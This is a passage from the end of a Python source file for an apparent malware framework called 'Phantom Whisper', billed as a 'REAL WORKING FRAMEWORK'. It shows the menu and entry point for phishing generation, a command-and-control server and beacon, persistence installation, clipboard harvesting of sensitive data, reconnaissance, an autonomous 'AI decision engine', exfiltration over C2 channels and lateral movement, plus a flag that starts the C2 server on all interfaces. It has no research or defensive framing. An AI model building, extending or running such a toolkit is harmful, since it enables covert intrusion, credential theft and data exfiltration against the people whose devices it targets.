        header.append("║           ██║    ██║██║  ██║██║██╔════╝██╔══██╗██╔════╝██╔══██╗         ║\n", style="bold magenta")
        header.append("║           ██║ █╗ ██║███████║██║███████╗██████╔╝█████╗  ██████╔╝         ║\n", style="bold magenta")
        header.append("║           ██║███╗██║██╔══██║██║╚════██║██╔═══╝ ██╔══╝  ██╔══██╗         ║\n", style="bold magenta")
        header.append("║           ╚███╔███╔╝██║  ██║██║███████║██║     ███████╗██║  ██║         ║\n", style="bold magenta")
        header.append("║            ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝╚══════╝╚═╝     ╚══════╝╚═╝  ╚═╝         ║\n", style="bold magenta")
        header.append("║                                                                           ║\n", style="bold magenta")
        header.append(f"║                    v{VERSION} — REAL WORKING FRAMEWORK                     ║\n", style="cyan")
        header.append("╚════════════════════════════════════════════════════════════════╝", style="bold magenta")
        return header

    def create_info_box(self):
        now = datetime.now().strftime("%H:%M:%S")
        return Panel(
            f"[cyan]Device:[/cyan] [white]{self.device_id}[/white]  "
            f"[cyan]Host:[/cyan] [white]{socket.gethostname()}[/white]  "
            f"[cyan]Time:[/cyan] [white]{now}[/white]",
            border_style="cyan"
        )

    def create_menu(self):
        menu = Table(show_header=False, border_style="dim", box=box.MINIMAL)
        menu.add_column("Key", style="cyan")
        menu.add_column("Option", style="white")
        menu.add_column("Description", style="dim")

        menu.add_row("[1]", "🎭 Social Engineering", "Generate phishing content")
        menu.add_row("[2]", "🌐 C2 Operations", "Beacon, server, commands")
        menu.add_row("[3]", "📱 Persistence", "Install autostart mechanisms")
        menu.add_row("[4]", "🔓 Clipboard Monitor", "Detect sensitive data")
        menu.add_row("[5]", "🕵️ Reconnaissance", "Scan device & network")
        menu.add_row("[6]", "🧠 Autonomous Mode", "AI decision engine")
        menu.add_row("[7]", "📤 Exfiltration", "Send data via C2 channels")
        menu.add_row("[8]", "🔄 Lateral Movement", "Port scan & pivot")
        menu.add_row("[9]", "⚙️ Configuration", "Edit settings")
        menu.add_row("[A]", "🚀 Termux Setup", "Install Termux environment")
        menu.add_row("[0]", "❌ Exit", "Shutdown framework")
        return menu

    async def run(self):
        """Main execution loop."""
        console.clear()
        console.print(self.create_header())
        console.print()

        while True:
            console.print()
            console.print(self.create_info_box())
            console.print()
            console.print(Align.center(self.create_menu()))
            console.print()

            choice = Prompt.ask(
                "[bold cyan]Select operation[/bold cyan]",
                choices=['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'A'],
                default='0'
            )

            console.clear()
            console.print(self.create_header())
            console.print()

            if choice == '0':
                self.shutdown()
                break
            elif choice.lower() == 'a':
                self.setup_termux_environment()
            elif choice == '1':
                self.social_engineering_menu()
            elif choice == '2':
                self.establish_c2_menu()
            elif choice == '3':
                self.persistence_menu()
            elif choice == '4':
                self.credential_harvest_menu()
            elif choice == '5':
                self.reconnaissance_menu()
            elif choice == '6':
                self.autonomous_mode_menu()
            elif choice == '7':
                self.exfiltration_menu()
            elif choice == '8':
                self.lateral_movement_menu()
            elif choice == '9':
                self.configuration_menu()

            if choice != '0':
                console.print()
                Prompt.ask("[dim]Press Enter to continue[/dim]")


# ═══════════════════════════════════════════════════════════════════════════════
# COMMAND-LINE ENTRY
# ═══════════════════════════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(description="Phantom Whisper v1.0.0")
    parser.add_argument("--server", action="store_true", help="Run as C2 server only")
    parser.add_argument("--daemon", action="store_true", help="Run in background mode")
    parser.add_argument("--recon", action="store_true", help="Run recon and exit")
    args = parser.parse_args()

    if args.server:
        c2 = C2Server(
            config.get("c2.c2_server_host", "0.0.0.0"),
            config.get("c2.http_port", 8080)
        )
        console.print(f"[bold green]C2 Server starting on 0.0.0.0:{config.get('c2.http_port', 8080)}[/bold green]")
        c2.start()
        return

    if args.recon:
        import asyncio
        recon = DeviceRecon()
        data = asyncio.run(recon.full_recon())
        print(json.dumps(data, indent=2, default=str))
        return

    app = PhantomWhisper()
    try:
        asyncio.run(app.run())
    except KeyboardInterrupt:
        console.print("\n[bold red]Interrupted. Shutting down...[/bold red]")
    except Exception as e:
        console.print(f"\n[bold red]Fatal error: {e}[/bold red]")
        log.error(f"Fatal: {e}")


if __name__ == "__main__":
    main()
